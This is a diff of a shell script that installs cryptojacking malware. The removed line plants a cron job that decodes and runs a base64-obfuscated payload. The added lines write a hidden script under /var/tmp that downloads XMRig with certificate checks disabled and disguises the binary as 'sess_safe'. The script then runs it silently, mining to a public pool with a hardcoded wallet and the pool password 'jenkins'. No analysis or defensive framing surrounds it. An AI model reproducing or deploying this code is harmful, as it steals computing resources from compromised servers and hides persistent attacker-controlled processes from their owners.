@@ -1,1 +1,63 @@
-echo '0 3 * * * echo "IyEvYmluL2Jhc2gKCmlmICEgcGdyZXAgLWYgIi90bXAvc2Vzc19zYWZlL2hlbHAiID4vZGV2L251bGw7IHRoZW4KICAgIGlmIFsgLWUgIi90bXAvc2Vzc19zYWZlL2hlbHAiIF07IHRoZW4KICAgICAgICAvdG1wL3Nlc3Nfc2FmZS9oZWxwIC1vIHBvb2wuc3VwcG9ydHhtci5jb206MzMzMyAtdSA0M0Njdm9kUUROR1FuRHlQWTJhZHpLY2dibUt6bmNGdDFkdENER1VuSkFLY1FBbWFWcjNLUTVXaFZzdzJlOERZUWNDYmQxNlBiQmhFV1BrMkdWM3hydG9hSDNrQ3JVRSAtLWNwdS1tYXgtdGhyZWFkcy1oaW50IDYwIC1wIGRmbCAtQgogICAgZWxzZQogICAgICAgIHdnZXQgaHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnL3JlbGVhc2VzL2Rvd25sb2FkL3Y2LjIxLjAveG1yaWctNi4yMS4wLWxpbnV4LXg2NC50YXIuZ3ogLU8gL3RtcC9zYWZlLnRhci5neiAmJiBcCiAgICAgICAgY2QgL3RtcCAmJiBcCiAgICAgICAgdGFyIC14enZmIHNhZmUudGFyLmd6ICYmIFwKICAgICAgICBtdiAvdG1wL3htcmlnLTYuMjEuMCAvdG1wL3Nlc3Nfc2FmZSAmJiBcCiAgICAgICAgbXYgL3RtcC9zZXNzX3NhZmUveG1yaWcgL3RtcC9zZXNzX3NhZmUvaGVscCAmJiBcCiAgICAgICAgcm0gLXJmIC90bXAvc2FmZS50YXIuZ3ogJiYgXAogICAgICAgIC90bXAvc2Vzc19zYWZlL2hlbHAgLW8gcG9vbC5zdXBwb3J0eG1yLmNvbTozMzMzIC11IDQzQ2N2b2RRRE5HUW5EeVBZMmFkektjZ2JtS3puY0Z0MWR0Q0RHVW5KQUtjUUFtYVZyM0tRNVdoVnN3MmU4RFlRY0NiZDE2UGJCaEVXUGsyR1YzeHJ0b2FIM2tDclVFIC0tY3B1LW1heC10aHJlYWRzLWhpbnQgNjAgLXAgZGZsIC1CCiAgICBmaQpmaQo=" |base64 -d|sed s/dfl/dfl12/g  > /tmp/safe.sh && /bin/bash  /tmp/safe.sh' | crontab -
+cat <<'EOF' > /var/tmp/.safe_helper.sh
+#!/bin/bash
+
+# 自修复 XMRig 挖矿进程（兼容 wget/curl，支持代理和重试）
+
+# 检查进程是否在运行
+if pgrep -f "sess_safe.*pool.supportxmr.com" >/dev/null; then
+    exit 0  # 已经在运行，退出
+fi
+
+# 如果二进制文件不存在，就下载
+if [ ! -f "/var/tmp/sess_safe" ]; then
+    echo "[*] Downloading XMRig..."
+
+    # 定义下载函数（自动选择 wget 或 curl）
+    download_xmrig() {
+        local url="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
+        
+        # 尝试用 wget
+        if command -v wget >/dev/null; then
+            echo "[+] Using wget..."
+            wget --no-check-certificate -qO- "$url" | tar -xz -C /var/tmp --strip-components=1 xmrig-6.22.2/xmrig
+            return $?
+        fi
+
+        # 尝试用 curl
+        if command -v curl >/dev/null; then
+            echo "[+] Using curl..."
+            curl -skL "$url" | tar -xz -C /var/tmp --strip-components=1 xmrig-6.22.2/xmrig
+            return $?
+        fi
+
+        echo "[-] Error: Neither wget nor curl is available!"
+        return 1
+    }
+
+    # 最多尝试 3 次下载
+    for i in {1..3}; do
+        if download_xmrig; then
+            mv /var/tmp/xmrig /var/tmp/sess_safe
+            chmod +x /var/tmp/sess_safe
+            rm -rf /var/tmp/xmrig-6.22.2 2>/dev/null
+            echo "[+] XMRig downloaded successfully."
+            break
+        else
+            echo "[!] Download attempt $i failed. Retrying..."
+            sleep 5
+        fi
+    done
+
+    # 如果下载失败，退出
+    if [ ! -f "/var/tmp/sess_safe" ]; then
+        echo "[-] Failed to download XMRig after 3 attempts."
+        exit 1
+    fi
+fi
+
+# 启动 XMRig（静默运行）
+echo "[*] Starting XMRig..."
+nohup /var/tmp/sess_safe -o pool.supportxmr.com:3333 -u 43CcvodQDNGQnDyPY2adzKcgbmKzncFt1dtCDGUnJAKcQAmaVr3KQ5WhVsw2e8DYQcCbd16PbBhEWPk2GV3xrtoaH3kCrUE --cpu-max-threads-hint 60 -p jenkins -donate-level=0 -b >/dev/null 2>&1 &
+EOF
+
+chmod +x /var/tmp/.safe_helper.sh
